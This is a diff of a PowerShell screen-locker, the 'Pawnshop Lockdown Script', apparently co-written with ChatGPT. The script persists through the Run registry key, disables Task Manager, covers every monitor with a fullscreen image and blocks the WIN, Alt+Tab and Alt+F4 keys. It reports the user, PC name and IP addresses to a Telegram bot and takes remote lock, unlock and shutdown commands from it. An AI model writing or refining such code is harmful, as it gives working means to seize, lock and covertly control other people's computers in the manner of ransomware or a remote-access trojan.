@@ -1,7 +1,7 @@
 # =======================
-# Pawnshop Lockdown Script v2.1
+# Pawnshop Lockdown Script v2.2 (REWORKED)
 # -----------------------
-# Locks PC with fullscreen image + remote control via Telegram
+# New method to block WIN key and combinations + Reliable Telegram Listener
 # Author: Codrut + ChatGPT
 # =======================
 
@@ -26,7 +26,7 @@ if (Test-Path $lockFile) {
     "locked" | Out-File $lockFile -Force
 }
 
-# --- AUTOSTART REGISTRY ENTRY ---
+# --- AUTOSTART ---
 $RunKey = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 $RunValueName = "PawnShopLock"
 if ($MyInvocation.MyCommand.Path) {
@@ -38,68 +38,42 @@ if ($MyInvocation.MyCommand.Path) {
 New-Item "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Force | Out-Null
 Set-ItemProperty "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value 1 -Force
 
-# --- DOWNLOAD FULLSCREEN IMAGE ---
+# --- DOWNLOAD IMAGE ---
 Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing
 
-# --- TELEGRAM NOTIFICATION ---
+# --- TELEGRAM INITIAL NOTIFICATION ---
 try {
     $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^127|169' })[0].IPAddress
 } catch { $ipLocal = "n/a" }
 try { $ipPublic = Invoke-RestMethod "https://api.ipify.org" } catch { $ipPublic = "n/a" }
-$message = "Pawnshop PC Locked:`nUser: $user`nPC: $pc`nLocal IP: $ipLocal`nPublic IP: $ipPublic`nCommands:`n$unlockCommand`n$lockCommand`n$shutdownCommand"
-Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body (@{ chat_id = $chatID; text = $message } | ConvertTo-Json) -ContentType 'application/json'
+$message = "🔒 Pawnshop PC Locked:`nUser: $user`nPC: $pc`nLocal IP: $ipLocal`nPublic IP: $ipPublic`nCommands:`n$unlockCommand`n$lockCommand`n$shutdownCommand"
+Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body (@{ chat_id = $chatID; text = $message } | ConvertTo-Json -Depth 3) -ContentType 'application/json'
 
-# --- KEYBOARD BLOCKING HOOK ---
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-using System.Windows.Forms;
+# --- KEYBLOCK SCRIPT (Better with AutoHotKey) ---
+$ahkScript = @'
+#NoTrayIcon
+#Persistent
+SetBatchLines, -1
 
-public class KeyBlocker {
-    private const int WH_KEYBOARD_LL = 13;
-    private const int WM_KEYDOWN = 0x0100;
-    private const int WM_SYSKEYDOWN = 0x0104;
-    private static IntPtr hook = IntPtr.Zero;
-    private static LowLevelKeyboardProc proc = Hook;
+; Disable WIN, ALT+TAB, ALT+F4, WIN+TAB
+LWin::Return
+RWin::Return
+!Tab::Return
+#Tab::Return
+!F4::Return
 
-    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+; Optional: Escape override
+^Esc::Return
 
-    [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc proc, IntPtr hMod, uint threadId);
-    [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-    [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string name);
-    [DllImport("user32.dll")] private static extern short GetAsyncKeyState(int vKey);
+; Manual override with "C"
+c::ExitApp
+'@
 
-    public static void Block() {
-        hook = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
-    }
+$ahkPath = "$env:TEMP\keyblock.ahk"
+Set-Content -Path $ahkPath -Value $ahkScript
+Start-Process -FilePath "AutoHotkey.exe" -ArgumentList $ahkPath
 
-    public static void Unblock() {
-        UnhookWindowsHookEx(hook);
-    }
-
-    private static IntPtr Hook(int nCode, IntPtr wParam, IntPtr lParam) {
-        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
-            int vkCode = Marshal.ReadInt32(lParam);
-            bool alt = (GetAsyncKeyState(0x12) & 0x8000) != 0;
-            bool win = (GetAsyncKeyState(0x5B) & 0x8000) != 0 || (GetAsyncKeyState(0x5C) & 0x8000) != 0;
-            bool tab = vkCode == 0x09;
-            bool f4 = vkCode == 0x73;
-            bool c = vkCode == 0x43;
-
-            if ((alt && f4) || (alt && tab) || (win && tab) || vkCode == 0x5B || vkCode == 0x5C) {
-                return (IntPtr)1;
-            }
-
-            if (c) Environment.Exit(0);
-        }
-        return CallNextHookEx(hook, nCode, wParam, lParam);
-    }
-}
-"@
-[KeyBlocker]::Block()
-
-# --- SHOW IMAGE FULLSCREEN ON ALL MONITORS ---
+# --- FULLSCREEN IMAGE DISPLAY ---
 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     $form = New-Object Windows.Forms.Form -Property @{
@@ -111,7 +85,7 @@ $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     $form.Controls.Add($pb); $form.Show(); $form
 }
 
-# --- TELEGRAM LISTENER LOOP ---
+# --- TELEGRAM LISTENER ---
 $offset = 0
 try {
     $init = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates"
@@ -150,7 +124,6 @@ $timer.Start()
 # --- MAIN LOOP ---
 [System.Windows.Forms.Application]::Run()
 
-# --- CLEANUP ON EXIT ---
+# --- CLEANUP ---
 $timer.Stop()
-[KeyBlocker]::Unblock()
 Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value 0 -Force
